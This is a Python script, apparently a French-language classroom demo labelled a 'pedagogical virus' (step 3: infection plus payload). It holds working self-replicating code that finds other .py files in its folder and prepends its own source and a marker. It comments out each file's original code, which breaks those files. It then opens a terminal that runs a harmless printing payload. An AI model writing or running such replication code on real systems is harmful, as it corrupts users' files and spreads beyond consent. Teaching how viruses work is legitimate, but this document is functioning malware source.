#!/usr/bin/env python3
# infection + payload

import os
import sys
import subprocess

SIGNATURE = "# === MARQUEUR_VIRUS_LAB ==="

PAYLOAD_CODE = r'''
import time, sys
print("=" * 55)
print("  [DÉMO] Virus pédagogique Cyber Tour — payload inoffensif")
print("=" * 55)
for i in range(1, 101):
    print(f"  [virus] cycle {i:02d}/100 — je suis actif...")
    time.sleep(0.4)
print("  [virus] fin de la démonstration.")
'''

def est_deja_infecte(chemin):
    try:
        with open(chemin, "r", encoding="utf-8") as f:
            return SIGNATURE in f.read()
    except (UnicodeDecodeError, PermissionError):
        return False

def code_du_virus():
    with open(os.path.abspath(__file__), "r", encoding="utf-8") as f:
        return f.read()

def lancer_payload(repertoire):
    payload_path = os.path.join(repertoire, "_payload_demo.py")
    if not os.path.exists(payload_path):
        with open(payload_path, "w", encoding="utf-8") as f:
            f.write(PAYLOAD_CODE)

    try:
        if sys.platform.startswith("win"):
            subprocess.Popen(
                ["cmd", "/c", "start", "cmd", "/k",
                 sys.executable, payload_path],
                shell=False
            )
        elif sys.platform == "darwin":
            subprocess.Popen(
                ["osascript", "-e",
                 f'tell application "Terminal" to do script '
                 f'"{sys.executable} {payload_path}"']
            )
        else:
            for term in (["x-terminal-emulator", "-e"],
                         ["gnome-terminal", "--"],
                         ["xterm", "-e"],
                         ["konsole", "-e"]):
                try:
                    subprocess.Popen(term + [sys.executable, payload_path])
                    break
                except FileNotFoundError:
                    continue
    except Exception as e:
        print(f"  [!] Impossible d'ouvrir la console : {e}")
        print("  [i] Payload exécuté dans le terminal courant à la place :")
        exec(PAYLOAD_CODE)

def infecter(chemin):
    if est_deja_infecte(chemin):
        print(f"  [=] Déjà infecté : {os.path.basename(chemin)}")
        return False
    try:
        with open(chemin, "r", encoding="utf-8") as f:
            original = f.read()
        contenu = (
            f"{SIGNATURE}\n"
            f"{code_du_virus()}\n"
            f"{original.replace(chr(10), chr(10) + '# ')}\n"
        )
        with open(chemin, "w", encoding="utf-8") as f:
            f.write(contenu)
        print(f"  [+] Infecté : {os.path.basename(chemin)}")
        return True
    except Exception as e:
        print(f"  [!] Erreur : {e}")
        return False

def propager(repertoire):
    virus_abs = os.path.abspath(__file__)
    for nom in os.listdir(repertoire):
        chemin = os.path.join(repertoire, nom)
        if os.path.isfile(chemin) and chemin.endswith(".py") \
           and os.path.abspath(chemin) != virus_abs \
           and not nom.startswith("_payload"):
            infecter(chemin)

if __name__ == "__main__":
    repertoire = os.path.dirname(os.path.abspath(__file__))
    print("[ÉTAPE 3] Infection + déclenchement du payload...")
    propager(repertoire)
    lancer_payload(repertoire)